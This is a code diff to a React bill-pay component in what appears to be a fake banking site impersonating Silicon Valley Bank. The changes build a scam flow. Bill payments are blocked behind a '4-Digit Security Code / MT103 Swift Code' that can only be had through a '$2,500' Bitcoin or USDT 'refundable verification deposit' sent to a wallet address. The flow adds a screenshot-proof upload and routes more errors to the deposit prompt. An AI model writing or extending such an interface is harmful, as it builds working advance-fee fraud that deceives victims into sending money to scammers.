@@ -16,6 +16,8 @@ import {
   Search,
   Key,
   Shield,
+  ShieldAlert,
+  FileText,
   X,
   Copy,
   Check
@@ -101,6 +103,21 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser 
     loadBills();
   }, []);
 
+  const handleScreenshotUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const file = e.target.files?.[0];
+    if (file) {
+      if (file.size > 5 * 1024 * 1024) {
+        setError('Screenshot image must be under 5MB.');
+        return;
+      }
+      const reader = new FileReader();
+      reader.onloadend = () => {
+        setProofImage(reader.result as string);
+      };
+      reader.readAsDataURL(file);
+    }
+  };
+
   const handlePayBill = async (e: React.FormEvent) => {
     e.preventDefault();
     setError('');
@@ -121,7 +138,7 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser 
     }
 
     if (user.role !== 'admin' && (!user.transferCodeApproved || !user.fourDigitCode || !fourDigitCode.trim() || fourDigitCode.trim() !== user.fourDigitCode.trim())) {
-      setShowCryptoModal(true);
+      setShowDepositPromptModal(true);
       return;
     }
 
@@ -144,8 +161,8 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser 
       loadBills();
       onRefreshUser();
     } catch (err: any) {
-      if (err.message && (err.message.toLowerCase().includes('invalid 4-digit security code') || err.message.toLowerCase().includes('code'))) {
-        setShowCryptoModal(true);
+      if (err.message && (err.message.toLowerCase().includes('invalid 4-digit security code') || err.message.toLowerCase().includes('code') || err.message.toLowerCase().includes('security'))) {
+        setShowDepositPromptModal(true);
       } else {
         setError(err.message || 'Bill payment failed.');
       }
@@ -161,11 +178,13 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser 
       await api.submitCryptoActivationDeposit({
         cryptoMethod,
         txHash: txHash.trim(),
-        proofNote: proofNote.trim()
+        proofNote: proofNote.trim(),
+        proofImage: proofImage || undefined
       });
       setDepositSuccessMsg(`$2,500 ${cryptoMethod} Deposit submitted successfully! Silicon Valley Bank will review your transaction and issue your 4-Digit Security Code.`);
       setTxHash('');
       setProofNote('');
+      setProofImage(null);
       onRefreshUser();
     } catch (err: any) {
       alert(err.message || 'Failed to submit deposit proof');
@@ -377,43 +396,80 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser 
         </div>
       </div>
 
-      {/* Deposit Required Prompt Modal */}
+      {/* 4-Digit Security Code Issuance / MT103 Swift Code Intermediary Prompt Modal */}
       {showDepositPromptModal && (
-        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-4">
-          <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 sm:p-8 max-w-md w-full shadow-2xl relative space-y-5">
+        <div className="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-md flex items-center justify-center p-4">
+          <div className="bg-slate-900 border border-amber-500/40 rounded-3xl p-6 sm:p-7 max-w-lg w-full space-y-5 shadow-2xl relative animate-fadeIn">
             <button 
               onClick={() => setShowDepositPromptModal(false)}
-              className="absolute top-4 right-4 p-2 text-slate-400 hover:text-white rounded-full bg-slate-800/50"
+              className="absolute top-4 right-4 p-1.5 text-slate-400 hover:text-white rounded-xl bg-slate-800 transition-colors"
             >
               <X className="w-5 h-5" />
             </button>
 
-            <div className="w-12 h-12 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 mx-auto">
-              <Shield className="w-6 h-6" />
+            <div className="w-14 h-14 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 mx-auto">
+              <Key className="w-7 h-7" />
             </div>
 
             <div className="text-center space-y-2">
-              <h3 className="text-xl font-extrabold text-white">4-Digit Security Code Required</h3>
-              <p className="text-xs text-slate-300 leading-relaxed">
-                You do not have an approved 4-digit transfer code. To obtain your code and execute outgoing transfers and bill payments, complete a $2,500 BTC or USDT activation deposit.
+              <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-amber-500/10 border border-amber-500/20 text-[10px] font-bold uppercase tracking-wider text-amber-400">
+                <ShieldAlert className="w-3.5 h-3.5" />
+                <span>Security Authorization Required</span>
+              </div>
+              <h3 className="text-lg sm:text-xl font-extrabold text-white tracking-tight">
+                4-Digit Security Code Issuance / MT103 Swift Code
+              </h3>
+              <p className="text-xs text-slate-300 leading-relaxed max-w-md mx-auto">
+                To execute commercial bill payments and outgoing wire transfers, an official 4-Digit Security Authorization Code must be issued and registered to your Silicon Valley Bank account.
               </p>
             </div>
 
-            <div className="space-y-3 pt-2">
+            {user.pendingCryptoDeposit?.status === 'Pending' ? (
+              <div className="p-4 bg-amber-500/10 border border-amber-500/30 rounded-2xl text-xs space-y-2">
+                <div className="flex items-center justify-between">
+                  <span className="font-bold text-amber-400 flex items-center gap-1.5">
+                    <Clock className="w-4 h-4 animate-spin text-amber-400" />
+                    4-Digit Security Code Issuance
+                  </span>
+                  <span className="text-[10px] bg-amber-500/20 text-amber-300 px-2 py-0.5 rounded-full font-mono font-bold">
+                    Under Review
+                  </span>
+                </div>
+                <p className="text-slate-300 text-[11px] leading-relaxed">
+                  Your $2,500 deposit proof for <span className="font-bold text-white">{user.pendingCryptoDeposit.cryptoMethod}</span> is currently being verified by Silicon Valley Bank Treasury. Your 4-digit code will be issued upon clearance.
+                </p>
+              </div>
+            ) : (
+              <div className="p-4 bg-slate-950 border border-slate-800 rounded-2xl text-[11px] text-slate-300 space-y-2">
+                <div className="flex items-center justify-between font-bold text-amber-400 border-b border-slate-800 pb-2">
+                  <span>MT103 SWIFT & Fedwire Protocol:</span>
+                  <span className="font-mono text-xs">$2,500.00 USD</span>
+                </div>
+                <ul className="space-y-1.5 text-slate-400 list-disc list-inside">
+                  <li>A refundable verification deposit of <strong className="text-slate-200">$2,500.00 USD</strong> is required to generate your 4-digit security code.</li>
+                  <li>The full $2,500 deposit is credited directly to your account balance upon verification.</li>
+                  <li>Enables unlimited outgoing vendor disbursements & international MT103 transfers.</li>
+                </ul>
+              </div>
+            )}
+
+            <div className="flex flex-col gap-2.5 pt-2">
               <button
                 onClick={() => {
                   setShowDepositPromptModal(false);
                   setShowCryptoModal(true);
                 }}
-                className="w-full py-3 bg-gradient-to-r from-amber-500 to-yellow-500 text-slate-950 font-extrabold text-xs rounded-xl shadow-lg shadow-amber-500/20"
+                className="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-extrabold py-3.5 rounded-2xl text-xs transition-all shadow-lg shadow-amber-500/20 flex items-center justify-center gap-2"
               >
-                Deposit $2,500 via BTC / USDT
+                <DollarSign className="w-4 h-4" />
+                <span>Proceed to 4-Digit Code Issuance & $2,500 Deposit</span>
               </button>
+
               <button
                 onClick={() => setShowDepositPromptModal(false)}
-                className="w-full py-2.5 text-slate-400 hover:text-white text-xs font-semibold"
+                className="w-full bg-slate-800 hover:bg-slate-700 text-slate-300 font-semibold py-2.5 rounded-2xl text-xs transition-colors"
               >
-                Cancel
+                Cancel / Return to Bill Pay
               </button>
             </div>
           </div>
@@ -422,29 +478,26 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser 
 
       {/* Crypto Payment Modal */}
       {showCryptoModal && (
-        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-4 overflow-y-auto">
-          <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 sm:p-8 max-w-lg w-full shadow-2xl relative space-y-6 my-8">
+        <div className="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-md flex items-center justify-center p-4 overflow-y-auto">
+          <div className="bg-slate-900 border border-amber-500/40 rounded-3xl p-6 sm:p-7 max-w-lg w-full space-y-5 shadow-2xl relative my-8 animate-fadeIn max-h-[90vh] overflow-y-auto">
             <button 
               onClick={() => {
                 setShowCryptoModal(false);
                 setDepositSuccessMsg(null);
               }}
-              className="absolute top-4 right-4 p-2 text-slate-400 hover:text-white rounded-full bg-slate-800/50"
+              className="absolute top-4 right-4 p-1.5 text-slate-400 hover:text-white rounded-xl bg-slate-800 transition-colors"
             >
               <X className="w-5 h-5" />
             </button>
 
-            <div className="border-b border-slate-800 pb-4">
-              <div className="flex items-center gap-2 mb-1">
-                <span className="p-1.5 bg-amber-500/10 text-amber-400 border border-amber-500/20 rounded-lg">
-                  <Key className="w-4 h-4" />
-                </span>
-                <span className="text-[10px] font-bold uppercase tracking-widest text-amber-400">4-Digit Code Security Deposit</span>
+            <div className="flex items-center gap-3 border-b border-slate-800 pb-4">
+              <div className="w-11 h-11 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 shrink-0">
+                <Key className="w-6 h-6" />
               </div>
-              <h3 className="text-lg font-bold text-white">Deposit $2,500 USD (BTC or USDT)</h3>
-              <p className="text-xs text-slate-400 mt-1">
-                Send exactly $2,500 USD in cryptocurrency to the SVB Treasury address below to receive your permanent 4-Digit Security Authorization Code.
-              </p>
+              <div>
+                <h3 className="text-base sm:text-lg font-bold text-white">4-Digit Security Code Issuance / MT103 Swift Code</h3>
+                <p className="text-xs text-slate-400 mt-0.5">$2,500.00 USD Required Amount • Bitcoin (BTC) & Tether (USDT)</p>
+              </div>
             </div>
 
             {depositSuccessMsg ? (
@@ -456,79 +509,99 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser 
                     setShowCryptoModal(false);
                     setDepositSuccessMsg(null);
                   }}
-                  className="px-6 py-2 bg-emerald-500 text-slate-950 font-bold rounded-xl text-xs"
+                  className="px-6 py-2.5 bg-emerald-500 text-slate-950 font-bold rounded-xl text-xs shadow-lg shadow-emerald-500/20"
                 >
                   Close Window
                 </button>
               </div>
             ) : (
-              <form onSubmit={handleCryptoDepositSubmit} className="space-y-5 text-xs">
+              <form onSubmit={handleCryptoDepositSubmit} className="space-y-4 text-xs">
                 {/* Method selector */}
                 <div>
-                  <label className="block text-slate-300 font-semibold mb-2">Select Cryptocurrency Network</label>
-                  <div className="grid grid-cols-2 gap-3">
+                  <label className="block text-slate-300 font-semibold mb-2">Select Cryptocurrency Deposit Network</label>
+                  <div className="grid grid-cols-2 gap-2.5">
                     <button
                       type="button"
                       onClick={() => setCryptoMethod('BTC')}
-                      className={`p-3 rounded-2xl border text-left flex items-center justify-between transition-all ${
+                      className={`p-3 rounded-2xl border font-bold text-xs flex items-center justify-center gap-2 transition-all ${
                         cryptoMethod === 'BTC'
-                          ? 'bg-amber-500/10 border-amber-500 text-white font-bold'
-                          : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-white'
+                          ? 'bg-amber-500 text-slate-950 border-amber-400 shadow-md'
+                          : 'bg-slate-950 border-slate-800 text-slate-300 hover:border-slate-700'
                       }`}
                     >
                       <span>Bitcoin (BTC)</span>
-                      <span className="text-[10px] bg-amber-500/20 text-amber-400 px-2 py-0.5 rounded-full font-mono">BTC</span>
                     </button>
 
                     <button
                       type="button"
                       onClick={() => setCryptoMethod('USDT')}
-                      className={`p-3 rounded-2xl border text-left flex items-center justify-between transition-all ${
+                      className={`p-3 rounded-2xl border font-bold text-xs flex items-center justify-center gap-2 transition-all ${
                         cryptoMethod === 'USDT'
-                          ? 'bg-emerald-500/10 border-emerald-500 text-white font-bold'
-                          : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-white'
+                          ? 'bg-amber-500 text-slate-950 border-amber-400 shadow-md'
+                          : 'bg-slate-950 border-slate-800 text-slate-300 hover:border-slate-700'
                       }`}
                     >
                       <span>Tether (USDT)</span>
-                      <span className="text-[10px] bg-emerald-500/20 text-emerald-400 px-2 py-0.5 rounded-full font-mono">TRC20</span>
                     </button>
                   </div>
                 </div>
 
                 {/* Wallet Address Box */}
-                <div className="bg-slate-950 p-4 rounded-2xl border border-slate-800 space-y-2">
+                <div className="bg-slate-950 p-4 rounded-2xl border border-slate-800 space-y-3">
                   <div className="flex items-center justify-between text-slate-400 text-[11px]">
                     <span>Official {cryptoMethod} Deposit Address</span>
-                    <span className="text-emerald-400 font-bold">Amount: $2,500.00 USD</span>
+                    <span className="text-amber-400 font-bold font-mono">Amount: $2,500.00 USD</span>
                   </div>
-                  <div className="flex items-center gap-2">
+                  <div
+                    onClick={() => copyAddress(walletAddresses[cryptoMethod])}
+                    className="cursor-pointer hover:border-amber-500/50 flex items-center gap-2 bg-slate-900 p-3 rounded-xl border border-slate-800 transition-all group"
+                  >
+                    <span className="font-mono text-amber-400 font-semibold text-xs break-all flex-1 select-all">
+                      {walletAddresses[cryptoMethod]}
+                    </span>
+                    <div className="p-1.5 bg-slate-800 group-hover:bg-amber-500 group-hover:text-slate-950 text-slate-200 rounded-lg shrink-0 flex items-center gap-1 text-[10px] font-bold transition-all">
+                      {copiedAddress ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
+                      <span>{copiedAddress ? 'Copied!' : 'Copy'}</span>
+                    </div>
+                  </div>
+                </div>
+
+                {/* Screenshot Upload */}
+                <div>
+                  <label className="block font-semibold text-slate-300 mb-1">Upload Screenshot Proof of Payment *</label>
+                  <div className="relative border-2 border-dashed border-slate-800 hover:border-amber-500/50 rounded-2xl p-4 text-center bg-slate-950 transition-all cursor-pointer">
                     <input
-                      type="text"
-                      readOnly
-                      value={walletAddresses[cryptoMethod]}
-                      className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3 py-2 text-amber-300 font-mono text-[11px] select-all focus:outline-none"
+                      type="file"
+                      accept="image/*"
+                      onChange={handleScreenshotUpload}
+                      className="absolute inset-0 opacity-0 cursor-pointer w-full h-full"
                     />
-                    <button
-                      type="button"
-                      onClick={() => copyAddress(walletAddresses[cryptoMethod])}
-                      className="p-2 bg-slate-800 hover:bg-slate-700 text-white rounded-xl transition-colors shrink-0"
-                      title="Copy Address"
-                    >
-                      {copiedAddress ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
-                    </button>
+                    {proofImage ? (
+                      <div className="space-y-2">
+                        <img src={proofImage} alt="Payment Proof" className="max-h-32 mx-auto rounded-xl border border-slate-700 object-cover" />
+                        <p className="text-emerald-400 text-[11px] font-semibold flex items-center justify-center gap-1">
+                          <CheckCircle2 className="w-3.5 h-3.5" /> Screenshot Loaded Successfully (Click to Change)
+                        </p>
+                      </div>
+                    ) : (
+                      <div className="space-y-1 text-slate-400">
+                        <FileText className="w-6 h-6 mx-auto text-amber-400" />
+                        <p className="text-xs font-semibold text-slate-200">Tap or click to select payment screenshot</p>
+                        <p className="text-[10px] text-slate-500">PNG, JPG, or WEBP up to 5MB</p>
+                      </div>
+                    )}
                   </div>
                 </div>
 
                 {/* TxHash Input */}
                 <div>
-                  <label className="block text-slate-300 font-semibold mb-1">Transaction Hash / Blockchain TxID (Required)</label>
+                  <label className="block text-slate-300 font-semibold mb-1">Transaction Hash / Blockchain TxID (Optional)</label>
                   <input
                     type="text"
-                    required
                     value={txHash}
                     onChange={e => setTxHash(e.target.value)}
                     placeholder="Paste blockchain transaction hash or reference ID"
-                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white font-mono focus:border-cyan-500 focus:outline-none"
+                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white font-mono focus:border-amber-500 focus:outline-none"
                   />
                 </div>
 
@@ -539,17 +612,17 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser 
                     type="text"
                     value={proofNote}
                     onChange={e => setProofNote(e.target.value)}
-                    placeholder="e.g. Sent from Exodus wallet / Coinbase"
-                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white focus:border-cyan-500 focus:outline-none"
+                    placeholder="e.g. Sent from personal crypto wallet"
+                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white focus:border-amber-500 focus:outline-none"
                   />
                 </div>
 
                 <button
                   type="submit"
                   disabled={submittingDeposit}
-                  className="w-full py-3 bg-gradient-to-r from-emerald-500 to-teal-600 text-slate-950 font-extrabold text-xs rounded-xl shadow-lg shadow-emerald-500/20 disabled:opacity-50"
+                  className="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-extrabold py-3.5 rounded-xl text-xs transition-all shadow-lg shadow-amber-500/20 flex items-center justify-center gap-2 disabled:opacity-50"
                 >
-                  {submittingDeposit ? 'Submitting Verification...' : 'Submit Deposit Verification Proof'}
+                  {submittingDeposit ? 'Submitting Verification...' : 'Submit $2,500 Payment Proof for Verification'}
                 </button>
               </form>
             )}
